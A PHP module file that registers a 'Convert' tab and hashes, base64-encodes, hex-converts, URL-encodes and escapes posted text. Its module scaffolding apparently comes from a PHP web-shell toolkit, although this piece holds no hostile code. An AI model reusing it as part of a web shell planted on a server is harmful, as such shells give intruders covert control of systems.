<?php
$GLOBALS['module']['convert']['id'] = "convert";
$GLOBALS['module']['convert']['title'] = "Convert";
$GLOBALS['module']['convert']['js_ontabselected'] = "
if((!portableMode) && ($('#decodeResult').children().length==1)) $('#decodeStr').focus();";
$GLOBALS['module']['convert']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Convert</p></th></tr>
</thead>
<tbody>
	<tr><td colspan='2'><textarea style='height:140px;min-height:140px;' id='decodeStr'></textarea></td></tr>
	<tr><td colspan='2'><span class='button' onclick='decode_go();'>convert</span></td></tr>
</tbody>
<tfoot id='decodeResult'><tr><td colspan='2'>You can also press ctrl+enter to submit</td></tr></tfoot>
</table>";

if(!function_exists('decode')){
	function decode($str){
		$res = "";
		$length = (int) strlen($str);

		$res .= decode_line("md5", md5($str), "input");
		$res .= decode_line("sha1", sha1($str), "input");

		$res .= decode_line("base64 encode", base64_encode($str), "textarea");
		$res .= decode_line("base64 decode", base64_decode($str), "textarea");


		$res .= decode_line("hex to string", @pack("H*" , $str), "textarea");
		$res .= decode_line("string to hex", bin2hex($str), "textarea");

		$ascii = "";
		for($i=0; $i<$length; $i++){
			$ascii .= ord(substr($str,$i,1))." ";
		}
		$res .= decode_line("ascii char", trim($ascii), "textarea");

		$res .= decode_line("reversed", strrev($str), "textarea");
		$res .= decode_line("lowercase", strtolower($str), "textarea");
		$res .= decode_line("uppercase", strtoupper($str), "textarea");

		$res .= decode_line("urlencode", urlencode($str), "textarea");
		$res .= decode_line("urldecode", urldecode($str), "textarea");
		$res .= decode_line("rawurlencode", rawurlencode($str), "textarea");
		$res .= decode_line("rawurldecode", rawurldecode($str), "textarea");

		$res .= decode_line("htmlentities", html_safe($str), "textarea");

		if(function_exists('hash_algos')){
			$algos = hash_algos();
			foreach($algos as $algo){
				if(($algo=='md5')||($algo=='sha1')) continue;
				$res .= decode_line($algo, hash($algo, $str), "input");
			}
		}

		return $res;
	}
}

if(!function_exists('decode_line')){
	function decode_line($type, $result, $inputtype){
		$res = "<tr><td class='colFit'>".$type."</td><td>";
		if($inputtype=='input'){
			$res .= "<input type='text' value='".html_safe($result)."' ondblclick='this.select();'>";
		}
		else{
			$res .= "<textarea style='height:80px;min-height:80px;' ondblclick='this.select();'>".html_safe($result)."</textarea>";
		}
		return $res;
	}
}

if(isset($p['decodeStr'])){
	$decodeStr = $p['decodeStr'];
	output(decode($decodeStr));
}
?>